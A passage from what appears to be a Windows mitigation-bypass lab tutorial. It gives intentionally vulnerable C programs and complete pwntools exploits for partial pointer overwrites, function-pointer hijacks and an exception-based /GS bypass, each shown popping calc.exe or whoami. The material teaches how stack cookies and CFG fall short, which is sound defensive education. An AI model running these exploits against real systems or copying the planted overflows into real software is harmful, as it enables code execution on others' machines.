    // VULNERABILITY: reads up to 40 bytes into 32-byte name field
    // Off-by-8: can overwrite the low bytes of pkt.action
    // Using fread to handle binary data (fgets stops at newline)
    int n = (int)fread(pkt.name, 1, 40, stdin);
    if (n > 0) {
        // Don't null-terminate - we want to preserve the partial overwrite bytes
        printf("[*] Read %d bytes\n", n);
        fflush(stdout);
    }

    process_packet(&pkt);
    return 0;
}
```

**Compile**:

```bash
# Save to C:\Windows_Mitigations_Lab\src\partial_overwrite.c
cd C:\Windows_Mitigations_Lab

# WITHOUT /GS, no ASLR (/FIXED) - isolate the partial overwrite
cl /GS- /Zi /D_CRT_SECURE_NO_WARNINGS src\partial_overwrite.c ^
   /Fe:bin\partial_overwrite.exe /link /NXCOMPAT /DYNAMICBASE:NO /FIXED /DEBUG

# WITH /GS - show that /GS doesn't help (struct members aren't reordered)
cl /GS /Zi /D_CRT_SECURE_NO_WARNINGS src\partial_overwrite.c ^
   /Fe:bin\partial_overwrite_gs.exe /link /NXCOMPAT /DYNAMICBASE:NO /FIXED /DEBUG

```

**Pwntools - Partial Overwrite**:

```python
#!/usr/bin/env python3
"""
exploits/sc_2_partial.py
Partial Overwrite Bypass - Corrupt low bytes of struct function pointer.

When the overflow is limited (off-by-N), we can only corrupt the low
byte(s) of the function pointer. Since log_message and exec_command are
in the same binary and ASLR is off, they share upper address bytes.

Works on Windows 11 + CET: targets struct member (indirect CALL, not RET).
NOT blocked by coarse-grained CFG (target is a valid function entry).
Blocked by: ASLR (randomizes upper bytes), fine-grained CFI.

Usage:
  python exploits\\sc_2_partial.py            # Discovery
  python exploits\\sc_2_partial.py --exploit   # Exploitation
"""

from pwn import *
import re
import sys

context.arch = 'amd64'
context.os = 'windows'
context.log_level = 'info'


def parse_address(output_bytes, label):
    """
    Parse a function address from the binary's output.
    Handles MSVCRT bare-hex format (e.g., 0000000140001F96)
    and glibc 0x-prefixed format.
    """
    decoded = output_bytes.decode(errors='replace')
    # Match: "label  @ 0000000140001F96" or "label @ 0x140001F96"
    pattern = rf'{re.escape(label)}\s+@\s+(0x)?([0-9A-Fa-f]+)'
    m = re.search(pattern, decoded)
    if m:
        return int(m.group(2), 16)
    return None


def discover():
    """
    Run the binary to see function addresses and compute the
    partial overwrite byte(s) needed. Auto-parses addresses.
    """
    binary_path = r'C:\Windows_Mitigations_Lab\bin\partial_overwrite.exe'

    log.info("Discovery: running binary to get function addresses")
    p = process([binary_path])

    output = b""
    try:
        output = p.recvuntil(b"Enter packet name", timeout=5)
    except:
        pass

    log.info(f"Output:\n{output.decode(errors='replace')}")

    p.sendline(b"test")
    try:
        rest = p.recvall(timeout=3)
        log.info(f"Rest:\n{rest.decode(errors='replace')}")
    except:
        pass
    p.close()

    # Auto-parse addresses
    log_addr = parse_address(output, 'log_message')
    exec_addr = parse_address(output, 'exec_command')

    if log_addr and exec_addr:
        log.success(f"log_message  = 0x{log_addr:016X}")
        log.success(f"exec_command = 0x{exec_addr:016X}")

        # Determine how many low bytes differ
        xor = log_addr ^ exec_addr
        n_bytes = (xor.bit_length() + 7) // 8
        log.info(f"Addresses differ in lowest {n_bytes} byte(s)")

        low_bytes = (exec_addr & ((1 << (n_bytes * 8)) - 1)).to_bytes(n_bytes, 'little')
        log.info(f"Low bytes to overwrite (LE): {low_bytes.hex()}")
        log.info(f"")
        log.info(f"Run exploit: python exploits\\sc_2_partial.py --exploit")
    else:
        log.error("Could not parse addresses from output")


def exploit():
    """
    Partial overwrite of function pointer's low byte(s).

    struct packet layout:
      +0x00: name[32]   (32 bytes)
      +0x20: action      (8 bytes, function pointer)
      +0x28: priority    (4 bytes)

    fread reads up to 40 bytes into name[32].
    Bytes 32-39 overflow into the action pointer.
    We only need to overwrite the low byte(s) to redirect.
    """
    binary_path = r'C:\Windows_Mitigations_Lab\bin\partial_overwrite.exe'

    log.info("Phase 1: reading addresses from binary output...")
    p = process([binary_path])

    output = b""
    try:
        output = p.recvuntil(b"Enter packet name", timeout=5)
    except:
        log.error("Timeout waiting for prompt")
        p.close()
        return

    # Auto-parse addresses
    log_addr = parse_address(output, 'log_message')
    exec_addr = parse_address(output, 'exec_command')

    if not log_addr or not exec_addr:
        log.error("Could not parse addresses")
        p.close()
        return

    log.success(f"log_message  = 0x{log_addr:016X}")
    log.success(f"exec_command = 0x{exec_addr:016X}")

    # Calculate how many low bytes differ
    xor = log_addr ^ exec_addr
    n_bytes = (xor.bit_length() + 7) // 8
    low_bytes = (exec_addr & ((1 << (n_bytes * 8)) - 1)).to_bytes(n_bytes, 'little')

    log.info(f"Addresses differ in lowest {n_bytes} byte(s)")
    log.info(f"Overwriting with: {low_bytes.hex()} (little-endian)")

    # Build payload:
    # name[0..8]   = "calc.exe\0" (passed as arg to action(name))
    # name[9..31]  = padding
    # name[32..32+n] = low bytes of exec_command
    command = b"calc.exe\x00"
    padding = b"X" * (32 - len(command))
    payload = command + padding + low_bytes

    log.info(f"Payload ({len(payload)} bytes):")
    log.info(f"  [0..{len(command)-1}]   command: {command}")
    log.info(f"  [{len(command)}..31]  padding: {len(padding)} bytes")
    log.info(f"  [32..{32+n_bytes-1}]   low bytes: {low_bytes.hex()} (partial overwrite)")

    p.send(payload)
    p.shutdown('send')

    try:
        output = p.recvall(timeout=5)
        log.info(f"Output:\n{output.decode(errors='replace')}")

        if b"[EXEC]" in output:
            log.success("Partial overwrite worked! exec_command was called!")
        elif b"[LOG]" in output:
            log.failure("Still calling log_message - check byte count")
        else:
            log.warning("Unexpected output")
    except:
        pass

    try:
        p.wait(timeout=3)
    except:
        pass

    if p.returncode is not None:
        exit_code = p.returncode & 0xFFFFFFFF
        log.info(f"Exit code: {hex(exit_code)}")

    p.close()


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--exploit":
        exploit()
    else:
        discover()
```

**Expected Results**:

```bash
# Discovery phase (addresses auto-parsed):
c:\Windows_Mitigations_Lab> python exploits\sc_2_partial.py
#[*] Discovery: running binary to get function addresses
#[*] Output:
#    log_message  @ 0000000140001F96
#    exec_command @ 00000001400043C7
#    Offset between: 9265 bytes
#[+] log_message  = 0x0000000140001F96
#[+] exec_command = 0x00000001400043C7
#[*] Addresses differ in lowest 2 byte(s)
#[*] Low bytes to overwrite (LE): c743

# Exploitation phase (auto-parsed — no manual update needed):
c:\Windows_Mitigations_Lab> python exploits\sc_2_partial.py --exploit
#[*] Phase 1: reading addresses from binary output...
#[+] log_message  = 0x0000000140001F96
#[+] exec_command = 0x00000001400043C7
#[*] Addresses differ in lowest 2 byte(s)
#[*] Overwriting with: c743 (little-endian)
#[*] Payload (34 bytes):
#[*]   [0..8]   command: b'calc.exe\x00'
#[*]   [9..31]  padding: 23 bytes
#[*]   [32..33]   low bytes: c743 (partial overwrite)
#[*] Output:
#    [*] Read 34 bytes
#    [*] Processing packet: name='calc.exe'
#    [*] Action ptr: 00000001400043C7     <- redirected!
#    [EXEC] Running: calc.exe             <- RCE!
#[+] Partial overwrite worked! exec_command was called!
```

> [!IMPORTANT]
> **Partial Overwrite vs Full Overwrite**: This technique only needs 1-2 bytes of overflow
> past the buffer boundary. Many bugs that seem "too small to exploit" (off-by-one,
> off-by-few) become exploitable when a function pointer is adjacent in a struct.
> ASLR makes this harder (randomizes upper bytes too). Note: MSVC CFG (`/guard:cf`) does
> NOT block this because the target (`exec_command`) is a valid function entry point — CFG
> is coarse-grained (see Technique 3's `--cfg-test` for proof).

#### Technique 3: Overwriting Function Pointers (stdin-based)

Same concept as Technique 1 but using a local binary with stdin input instead of a
network server. This demonstrates that the struct-based function pointer overwrite
works identically for local exploits.

**Vulnerable Code (Windows)**:

```c
// func_ptr_overwrite.c
// Demonstrates: struct-based function pointer overwrite via stdin
// Same principle as the network server (Technique 1), but as a local binary.
//
// The struct guarantees member order. /GS cannot reorder struct internals.
// fgets() overflow past data[128] directly overwrites handler at offset 128.

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

typedef void (*callback_t)(const char*);

// /GS does NOT reorder struct members
struct request {
    char data[128];          // offset 0   - overflow source
    callback_t handler;      // offset 128 - overflow target
    int status;              // offset 136
};

void safe_handler(const char* msg) {
    printf("[SAFE] Handler: %s\n", msg);
}

void dangerous_handler(const char* msg) {
    printf("[DANGER] Executing: %s\n", msg);
    system(msg);  // RCE!
}

void process_request(struct request *req) {
    printf("[*] Processing request...\n");
    printf("[*] Handler points to: %p\n", (void*)req->handler);
    fflush(stdout);

    // Call handler with data - indirect CALL, not RET
    // CET shadow stacks don't protect this
    req->handler(req->data);
}

int main() {
    struct request req;

    req.handler = safe_handler;
    req.status = 0;
    memset(req.data, 0, 128);

    printf("safe_handler      @ %p\n", (void*)safe_handler);
    printf("dangerous_handler @ %p\n", (void*)dangerous_handler);
    printf("req.data          @ %p\n", req.data);
    printf("req.handler       @ %p (offset %zu from data)\n",
           &req.handler, (char*)&req.handler - req.data);
    fflush(stdout);

    printf("\nEnter request data: ");
    fflush(stdout);

    // VULNERABILITY: reads 256 bytes into 128-byte data field via fread
    // fread handles binary data correctly (no newline issues)
    int n = (int)fread(req.data, 1, 256, stdin);
    printf("[*] Read %d bytes\n", n);
    fflush(stdout);

    process_request(&req);

    return 0;
}
```

**Compile**:

```bash
# Save to C:\Windows_Mitigations_Lab\src\func_ptr_overwrite.c
cd C:\Windows_Mitigations_Lab

# WITHOUT /GS - baseline
cl /GS- /Zi /D_CRT_SECURE_NO_WARNINGS src\func_ptr_overwrite.c ^
   /Fe:bin\func_ptr_overwrite.exe /link /NXCOMPAT /DYNAMICBASE:NO /FIXED /DEBUG

# WITH /GS - prove struct members are NOT reordered
cl /GS /Zi /D_CRT_SECURE_NO_WARNINGS src\func_ptr_overwrite.c ^
   /Fe:bin\func_ptr_overwrite_gs.exe /link /NXCOMPAT /DYNAMICBASE:NO /FIXED /DEBUG

# WITH CFG - observe coarse-grained protection
cl /GS /Zi /guard:cf /D_CRT_SECURE_NO_WARNINGS src\func_ptr_overwrite.c ^
   /Fe:bin\func_ptr_overwrite_cfg.exe /link /NXCOMPAT /DYNAMICBASE:NO /FIXED /guard:cf /DEBUG
```

**Pwntools Exploit - Function Pointer Overwrite**:

```python
#!/usr/bin/env python3
"""
exploits/sc_3_funcptr.py
Function Pointer Overwrite via stdin - Bypasses /GS Stack Cookies

Same struct-based technique as the network server exploit (Technique 1),
but targeting a local binary that reads from stdin via fread().

struct request { char data[128]; callback_t handler; int status; };
fread() overflow: 256 bytes into data[128] overwrites handler at offset 128.

Addresses are auto-parsed from the binary's runtime output — no manual
updates needed between rebuilds.

Works on Windows 11 + CET: struct member corruption, not return address.
NOT blocked by coarse-grained CFG (target is a valid function entry).
Blocked by: fine-grained CFI (Clang -fsanitize=cfi).

Usage:
  python exploits\\sc_3_funcptr.py            # Discovery
  python exploits\\sc_3_funcptr.py --exploit   # Exploitation
"""

from pwn import *
import re
import sys

context.arch = 'amd64'
context.os = 'windows'
context.log_level = 'info'


def parse_address(output_bytes, label):
    """
    Parse a function address from binary output.
    Handles MSVCRT bare-hex (0000000140001F96) and 0x-prefixed formats.
    """
    decoded = output_bytes.decode(errors='replace')
    pattern = rf'{re.escape(label)}\s+@\s+(0x)?([0-9A-Fa-f]+)'
    m = re.search(pattern, decoded)
    if m:
        return int(m.group(2), 16)
    return None


def parse_offset(output_bytes):
    """
    Parse the handler offset from 'offset NNN from data' in binary output.
    """
    decoded = output_bytes.decode(errors='replace')
    m = re.search(r'offset\s+(\d+)\s+from\s+data', decoded)
    if m:
        return int(m.group(1))
    return 128  # default fallback


def discover():
    """Run the binary to find function addresses and verify struct layout."""
    binary_path = r'C:\Windows_Mitigations_Lab\bin\func_ptr_overwrite.exe'

    log.info("Discovery: running binary to find addresses")
    p = process([binary_path])

    output = b""
    try:
        output = p.recvuntil(b"Enter request data:", timeout=5)
        log.info(f"Output:\n{output.decode(errors='replace')}")
    except:
        pass

    # Send cyclic pattern to find exact offset
    pattern = cyclic(256)
    p.send(pattern)
    p.shutdown('send')

    try:
        rest = p.recvall(timeout=5)
        log.info(f"Rest:\n{rest.decode(errors='replace')}")
    except:
        pass
    p.close()

    # Auto-parse addresses
    safe_addr = parse_address(output, 'safe_handler')
    danger_addr = parse_address(output, 'dangerous_handler')
    offset = parse_offset(output)

    if safe_addr and danger_addr:
        log.success(f"safe_handler      = 0x{safe_addr:016X}")
        log.success(f"dangerous_handler = 0x{danger_addr:016X}")
        log.info(f"Handler offset from data: {offset}")
        log.info(f"")
        log.info(f"Run: python exploits\\sc_3_funcptr.py --exploit")
    else:
        log.error("Could not parse addresses from output")


def exploit():
    """Overwrite handler with dangerous_handler address (auto-parsed)."""
    binary_path = r'C:\Windows_Mitigations_Lab\bin\func_ptr_overwrite.exe'

    log.info("Phase 1: reading addresses from binary output...")
    p = process([binary_path])

    output = b""
    try:
        output = p.recvuntil(b"Enter request data:", timeout=5)
    except:
        log.error("Timeout waiting for prompt")
        p.close()
        return

    # Auto-parse dangerous_handler address and offset
    danger_addr = parse_address(output, 'dangerous_handler')
    offset = parse_offset(output)

    if not danger_addr:
        log.error("Could not parse dangerous_handler address")
        p.close()
        return

    log.success(f"dangerous_handler = 0x{danger_addr:016X} (auto-parsed)")
    log.info(f"Handler at offset {offset} from buffer start")

    # Build payload:
    # data[0..8]       = "calc.exe\0" (command for system())
    # data[9..off-1]   = padding
    # data[off..off+7] = p64(dangerous_handler)  -> overwrites handler
    command = b"calc.exe\x00"
    padding = b"B" * (offset - len(command))
    payload = command + padding + p64(danger_addr)

    log.info(f"Payload ({len(payload)} bytes):")
    log.info(f"  [0..{len(command)-1}]     command: {command}")
    log.info(f"  [{len(command)}..{offset-1}]  padding: {len(padding)} bytes")
    log.info(f"  [{offset}..{offset+7}] handler: 0x{danger_addr:X}")

    p.send(payload)
    p.shutdown('send')

    try:
        output = p.recvall(timeout=5)
        log.info(f"Output:\n{output.decode(errors='replace')}")

        if b"[DANGER]" in output:
            log.success("Function pointer overwrite worked!")
            log.success("dangerous_handler called system(\"calc.exe\")")
        elif b"[SAFE]" in output:
            log.failure("Still calling safe_handler - offset wrong")
    except:
        pass

    try:
        p.wait(timeout=3)
    except:
        pass

    if p.returncode is not None:
        exit_code = p.returncode & 0xFFFFFFFF
        log.info(f"Exit code: {hex(exit_code)}")
        if exit_code == 0xc0000409:
            log.info("GS cookie check fired AFTER handler ran (expected)")

    p.close()


def cfg_test():
    """
    Demonstrate the difference between coarse-grained CFG and fine-grained.

    CFG maintains a bitmap of ALL valid function entry points. It checks:
      "Is the target address a valid function start?" — YES/NO.
    It does NOT check:
      "Is this specific call site allowed to call this specific function?"

    So redirecting handler from safe_handler -> dangerous_handler WORKS
    even with CFG, because dangerous_handler is a valid function entry.

    But redirecting to a MID-FUNCTION address (e.g., dangerous_handler+4)
    FAILS because that's not in the CFG bitmap.

    This test proves both behaviors.
    """
    binary_path = r'C:\Windows_Mitigations_Lab\bin\func_ptr_overwrite_cfg.exe'

    log.info("CFG Test: demonstrating coarse-grained vs fine-grained")
    log.info("")

    # --- Test 1: redirect to dangerous_handler (valid function entry) ---
    log.info("=" * 60)
    log.info("TEST 1: Redirect to dangerous_handler (valid function entry)")
    log.info("=" * 60)

    p = process([binary_path])
    output = b""
    try:
        output = p.recvuntil(b"Enter request data:", timeout=5)
    except:
        pass

    danger_addr = parse_address(output, 'dangerous_handler')
    offset = parse_offset(output)

    if not danger_addr:
        log.error("Could not parse dangerous_handler")
        p.close()
        return

    log.info(f"dangerous_handler = 0x{danger_addr:X} (valid function entry)")

    command = b"calc.exe\x00"
    padding = b"B" * (offset - len(command))
    payload = command + padding + p64(danger_addr)
    p.send(payload)
    p.shutdown('send')

    try:
        out1 = p.recvall(timeout=5)
        log.info(f"Output:\n{out1.decode(errors='replace')}")
        if b"[DANGER]" in out1:
            log.success("CFG ALLOWED the call — target is a valid function entry!")
        elif b"[SAFE]" in out1:
            log.failure("Still safe_handler")
    except:
        pass

    try:
        p.wait(timeout=3)
    except:
        pass
    exit1 = (p.returncode or 0) & 0xFFFFFFFF
    log.info(f"Exit code: {hex(exit1)}")
    p.close()

    # --- Test 2: redirect to mid-function address (NOT a valid entry) ---
    log.info("")
    log.info("=" * 60)
    log.info("TEST 2: Redirect to dangerous_handler+4 (mid-function, NOT in CFG bitmap)")
    log.info("=" * 60)

    p = process([binary_path])
    output = b""
    try:
        output = p.recvuntil(b"Enter request data:", timeout=5)
    except:
        pass

    danger_addr = parse_address(output, 'dangerous_handler')
    offset = parse_offset(output)
    mid_func = danger_addr + 4  # NOT a function entry point

    log.info(f"dangerous_handler+4 = 0x{mid_func:X} (mid-function, invalid CFG target)")

    command = b"calc.exe\x00"
    padding = b"B" * (offset - len(command))
    payload = command + padding + p64(mid_func)
    p.send(payload)
    p.shutdown('send')

    try:
        out2 = p.recvall(timeout=5)
        log.info(f"Output:\n{out2.decode(errors='replace')}")
        if b"[DANGER]" in out2:
            log.warning("Call went through — CFG didn't catch mid-function?")
    except:
        pass

    try:
        p.wait(timeout=3)
    except:
        pass
    exit2 = (p.returncode or 0) & 0xFFFFFFFF
    log.info(f"Exit code: {hex(exit2)}")

    # CFG violation triggers __fastfail(FAST_FAIL_GUARD_ICALL_CHECK_FAILURE)
    # which raises STATUS_BREAKPOINT (0x80000003) via int 0x29
    if exit2 in (0x80000003, 0xc0000409):
        log.success("CFG BLOCKED the call — target is NOT a valid function entry!")
        if exit2 == 0x80000003:
            log.info("  STATUS_BREAKPOINT via __fastfail (CFG kill mechanism)")
    elif exit2 == 0xc0000005:
        log.success("Access Violation — mid-function jump crashed")
    else:
        log.info(f"Unexpected exit code (may still indicate CFG block)")

    p.close()

    # --- Summary ---
    log.info("")
    log.info("=" * 60)
    log.info("CONCLUSION:")
    log.info("  CFG is COARSE-GRAINED — it checks if the target is ANY valid")
    log.info("  function entry point, not whether THIS call site should call")
    log.info("  THAT specific function.")
    log.info("")
    log.info("  -> Redirect to another valid function: CFG ALLOWS (demonstrated!)")
    log.info("  -> Redirect to mid-function / shellcode:  CFG BLOCKS")
    log.info("")
    log.info("  Fine-grained CFI (e.g., Clang CFI, LLVM type-based) would block")
    log.info("  the valid-function redirect too, by checking type signatures.")
    log.info("=" * 60)


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--exploit":
        exploit()
    elif len(sys.argv) > 1 and sys.argv[1] == "--cfg-test":
        cfg_test()
    else:
        discover()
```

**Expected Results**:

```bash
# Discovery:
c:\Windows_Mitigations_Lab> python exploits\sc_3_funcptr.py
#[*] Output:
#    safe_handler      @ 0000000140001F8C
#    dangerous_handler @ 00000001400043BD
#    req.data          @ 000000000014F930
#    req.handler       @ 000000000014F9B0 (offset 128 from data)
#
#[*] Rest:
#    [*] Read 256 bytes
#    [*] Processing request...
#    [*] Handler points to: 6261616962616168  <- cyclic at offset 128!

# Exploitation (address auto-parsed — no manual update needed):
c:\Windows_Mitigations_Lab> python exploits\sc_3_funcptr.py --exploit
#[*] Phase 1: reading addresses from binary output...
#[+] dangerous_handler = 0x00000001400043C7 (auto-parsed)
#[*] Handler at offset 128 from buffer start
#[*] Payload (136 bytes):
#[*]   [0..8]     command: b'calc.exe\x00'
#[*]   [9..127]   padding: 119 bytes
#[*]   [128..135]  handler: 0x1400043C7
#[*] Output:
#    [*] Read 136 bytes
#    [*] Processing request...
#    [*] Handler points to: 00000001400043C7
#    [DANGER] Executing: calc.exe                <- RCE!
#[+] Function pointer overwrite worked!

# All three builds: same result (including CFG build!)
# Why? See CFG test below.

# CFG coarse-grained test:
c:\Windows_Mitigations_Lab> python exploits\sc_3_funcptr.py --cfg-test
#[*] TEST 1: Redirect to dangerous_handler (valid function entry)
#[+] CFG ALLOWED the call — target is a valid function entry!
#[*] Exit code: 0x0
#
#[*] TEST 2: Redirect to dangerous_handler+4 (mid-function, NOT in CFG bitmap)
#[+] CFG BLOCKED the call — target is NOT a valid function entry!
#[*]   STATUS_BREAKPOINT via __fastfail (CFG kill mechanism)
#[*] Exit code: 0x80000003
#
#[*] CONCLUSION:
#[*]   CFG is COARSE-GRAINED — it checks if the target is ANY valid
#[*]   function entry point, not whether THIS call site should call
#[*]   THAT specific function.
```

| Build                        | /GS | CFG | Target                | Result      | Why                                            |
| ---------------------------- | --- | --- | --------------------- | ----------- | ---------------------------------------------- |
| `func_ptr_overwrite.exe`     | OFF | OFF | `dangerous_handler`   | **RCE**     | No protection at all                           |
| `func_ptr_overwrite_gs.exe`  | ON  | OFF | `dangerous_handler`   | **RCE**     | /GS doesn't reorder struct members             |
| `func_ptr_overwrite_cfg.exe` | ON  | ON  | `dangerous_handler`   | **RCE**     | CFG allows — target is a valid function entry  |
| `func_ptr_overwrite_cfg.exe` | ON  | ON  | `dangerous_handler+4` | **Blocked** | CFG blocks — mid-function is not in CFG bitmap |

> [!WARNING]
> **CFG is coarse-grained!** It maintains a bitmap of valid function entry points and
> checks "is the target ANY valid function start?" — not "is this specific call site
> allowed to call this specific function?"
>
> This means redirecting `handler` from `safe_handler` to `dangerous_handler` **passes
> CFG validation** because `dangerous_handler` is a legitimate function. Only calls to
> addresses that are NOT function entries (shellcode, ROP gadgets, mid-function offsets)
> are blocked.
>
> **Fine-grained CFI** (e.g., Clang's `-fsanitize=cfi`, LLVM type-based CFI) would block
> this by checking that the function pointer's **type signature** matches the call site.
> MSVC does not currently offer fine-grained CFI.
>
> **Key takeaway**: CFG stops shellcode injection and ROP chains via indirect calls, but
> does NOT prevent redirecting between valid functions of compatible signatures.

#### Technique 4: Exception-Based Bypass

Trigger a controlled exception BEFORE the function epilogue runs the cookie check.
The cookie is only verified at function return (`__security_check_cookie`), so if an
exception diverts control flow before that point, the cookie is never checked.

> [!WARNING]
> **x64 vs x86**: On x86, the classic version of this attack overwrites the SEH chain on
> the stack to hijack exception handling. On x64 Windows, SEH is **table-based** (stored in
> the read-only `.pdata` section), so SEH chain overwrites are impossible.
>
> On x64, the exception-based bypass instead demonstrates that the cookie check is skipped
> entirely when an exception fires mid-function. The attacker doesn't gain code execution
> through the exception handler itself, but through data already corrupted before the
> exception (e.g., a function pointer in a struct that was called, or a variable that
> controls a security decision).

**Vulnerable Code**:

```c
// exception_bypass.c
// Demonstrates: exception fires BEFORE cookie check, proving /GS has a window
// of vulnerability between buffer overflow and function epilogue.
//
// This binary uses a struct with a flag field. The overflow corrupts the flag
// BEFORE an intentional null dereference triggers an exception. The __except
// handler checks the (now-corrupted) flag and grants elevated access.
//
// This is a data-only attack: no return address or function pointer corruption.

#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <stdlib.h>

struct session {
    char username[64];     // offset 0   - overflow source
    int is_admin;          // offset 64  - overflow target (security flag)
    char *profile_ptr;     // offset 72  - will be NULL -> exception
};

void handle_request(const char *input) {
    struct session sess;
    sess.is_admin = 0;          // Not admin by default
    sess.profile_ptr = NULL;    // Will cause exception when dereferenced

    printf("[*] Session initialized: is_admin=%d\n", sess.is_admin);
    fflush(stdout);

    // VULNERABILITY: copies more than 64 bytes into username[64]
    // Overflow corrupts is_admin and profile_ptr
    memcpy(sess.username, input, strlen(input));

    printf("[*] After input: is_admin=%d, profile_ptr=%p\n",
           sess.is_admin, (void*)sess.profile_ptr);
    fflush(stdout);

    // This __try/__except block catches the null deref exception.
    // The cookie check at function return is NEVER reached because
    // exception handling transfers control to the __except block.
    __try {
        // Dereference profile_ptr directly - WILL crash on NULL or garbage.
        // NOTE: printf("%s", NULL) on MSVCRT prints "(null)" instead of
        // crashing, so we MUST use a direct memory read to trigger the
        // access violation.
        char first = sess.profile_ptr[0];  // ACCESS VIOLATION here!
        printf("[*] Profile loaded: %c...\n", first);
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        printf("[!] Exception caught (null/bad pointer dereference)\n");
        fflush(stdout);

        // BUG: checking a variable that was corrupted by the overflow!
        // The developer assumed is_admin couldn't be corrupted because
        // /GS "protects the stack". But the overflow happened in a struct,
        // and the exception skipped the cookie check entirely.
        if (sess.is_admin == 0x41414141) {
            // In a real app this might check is_admin != 0
            printf("[!] ADMIN ACCESS GRANTED (is_admin was corrupted!)\n");
            printf("[!] Executing admin command...\n");
            fflush(stdout);
            system("whoami");  // Simulating privileged action
        } else {
            printf("[*] Access denied (is_admin=%d)\n", sess.is_admin);
        }
    }
    // Cookie check would happen HERE at function return.
    // But if we entered the __except block, the corrupted cookie
    // was already "handled" by the exception mechanism.
    printf("[*] Function returning (cookie check happens now)...\n");
    fflush(stdout);
}

int main(int argc, char **argv) {
    printf("=== Exception-Based /GS Bypass Demo ===\n");
    printf("struct session layout:\n");
    printf("  username[64]  @ offset 0\n");
    printf("  is_admin      @ offset 64\n");
    printf("  profile_ptr   @ offset 72\n");
    fflush(stdout);

    if (argc > 1) {
        handle_request(argv[1]);
    } else {
        printf("\nUsage: exception_bypass.exe <input>\n");
        printf("Try: exception_bypass.exe %s\n",
               "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
               "AAAA");
    }
    return 0;
}
```

**Compile**:

```bash
# Save to C:\Windows_Mitigations_Lab\src\exception_bypass.c
cd C:\Windows_Mitigations_Lab

# WITH /GS - to show exception bypasses cookie check
cl /GS /Zi /D_CRT_SECURE_NO_WARNINGS src\exception_bypass.c ^
   /Fe:bin\exception_bypass.exe /link /NXCOMPAT /DYNAMICBASE:NO /FIXED /DEBUG

```

**Pwntools - Exception-Based Bypass**:

```python
#!/usr/bin/env python3
"""
exploits/sc_4_exception.py
Exception-Based Stack Cookie Bypass

The overflow corrupts a security flag (is_admin) in a struct. Before the
function returns (where /GS checks the cookie), a null pointer dereference
triggers an exception. The __except handler reads the corrupted is_admin
flag and grants admin access.

This demonstrates that /GS only protects at function RETURN. Any security
decision made between the overflow and the return is vulnerable.

Works on Windows 11 + CET: no return address or function pointer corruption.
This is a pure data-only attack targeting a security-critical variable.

Usage:
  python exploits\\sc_4_exception.py
"""

from pwn import *

context.arch = 'amd64'
context.os = 'windows'
context.log_level = 'info'


def exploit():
    binary_path = r'C:\Windows_Mitigations_Lab\bin\exception_bypass.exe'

    # struct session layout:
    #   username[64]   @ offset 0     (64 bytes)
    #   is_admin       @ offset 64    (4 bytes, int)
    #   profile_ptr    @ offset 72    (8 bytes, after padding)
    #
    # Overflow username to set is_admin = 0x41414141 ("AAAA")
    # profile_ptr gets corrupted too -> causes exception -> __except fires
    # __except checks corrupted is_admin -> grants access

    USERNAME_SIZE = 64
    IS_ADMIN_OFFSET = 64
    # profile_ptr is at offset 72 (after 4 bytes padding between int and pointer)
    PROFILE_PTR_OFFSET = 72

    # Fill username buffer
    payload = b"A" * USERNAME_SIZE
    # Overflow into is_admin: set to 0x41414141 ("AAAA")
    payload += b"A" * 4  # is_admin = 0x41414141 (bytes 64-67)
    # Padding between is_admin (int, 4 bytes) and profile_ptr (8-byte aligned)
    payload += b"A" * 4  # padding bytes 68-71
    # Corrupt profile_ptr with garbage address -> access violation in __try
    # 0x4141414141414141 is unmapped -> guaranteed crash
    payload += b"A" * 8  # profile_ptr = 0x4141414141414141 (bytes 72-79)

    log.info(f"Payload: {len(payload)} bytes")
    log.info(f"  [0..63]   username: 64 x 'A'")
    log.info(f"  [64..67]  is_admin: 0x41414141 ('AAAA')")
    log.info(f"  [68..71]  padding:  4 x 'A'")
    log.info(f"  [72..79]  profile_ptr: 0x4141414141414141 (garbage -> crash)")

    # Pass payload as command line argument
    # Since it's all 'A' characters, no binary data issues with argv
    p = process([binary_path, payload.decode('latin-1')])

    try:
        output = p.recvall(timeout=5)
        decoded = output.decode(errors='replace')
        log.info(f"Output:\n{decoded}")

        if "ADMIN ACCESS GRANTED" in decoded:
            log.success("Exception-based bypass worked!")
            log.success("/GS cookie was NEVER checked - exception skipped it")
            log.success("Corrupted is_admin was trusted in __except handler")
        elif "Access denied" in decoded:
            log.failure("is_admin not corrupted correctly - adjust offset")
        elif "c0000409" in decoded.lower():
            log.failure("/GS caught the corruption before exception fired")
        else:
            log.warning("Unexpected output - check manually")
    except:
        pass

    try:
        p.wait(timeout=3)
    except:
        pass

    if p.returncode is not None:
        exit_code = p.returncode & 0xFFFFFFFF
        log.info(f"Exit code: {hex(exit_code)}")
        if exit_code == 0xc0000409:
            log.info("GS cookie check fired at function return (after __except)")
            log.info("But the damage is done - admin action already executed!")
        elif exit_code == 0:
            log.info("Clean exit - exception was handled, cookie was OK")

    p.close()


if __name__ == "__main__":
    exploit()
```

**Expected Results**:

```bash
c:\Windows_Mitigations_Lab> python exploits\sc_4_exception.py
#[*] Payload: 80 bytes
#[*]   [0..63]   username: 64 x 'A'
#[*]   [64..67]  is_admin: 0x41414141 ('AAAA')
#[*]   [68..71]  padding:  4 x 'A'
#[*]   [72..79]  profile_ptr: 0x4141414141414141 (garbage -> crash)
#[*] Output:
#    === Exception-Based /GS Bypass Demo ===
#    struct session layout:
#      username[64]  @ offset 0
#      is_admin      @ offset 64
#      profile_ptr   @ offset 72
#    [*] Session initialized: is_admin=0
#    [*] After input: is_admin=1094795585, profile_ptr=4141414141414141
#    [!] Exception caught (null/bad pointer dereference)
#    [!] ADMIN ACCESS GRANTED (is_admin was corrupted!)
#    [!] Executing admin command...
#    dev\user                                     <- whoami output
#    [*] Function returning (cookie check happens now)...
#[+] Exception-based bypass worked!
#[+] /GS cookie was NEVER checked - exception skipped it
#[+] Corrupted is_admin was trusted in __except handler
#[*] Exit code: 0x0
```

> [!IMPORTANT]
> **Why This Works**: The `/GS` cookie is checked in the function **epilogue** (right before
> `ret`). If an exception occurs mid-function, the `__except` handler runs in a different
> context. The corrupted `is_admin` variable is read in the handler before the cookie is
> ever validated. This is a fundamental limitation of stack cookies — they're a **post-hoc**
> check, not a prevention mechanism.
>
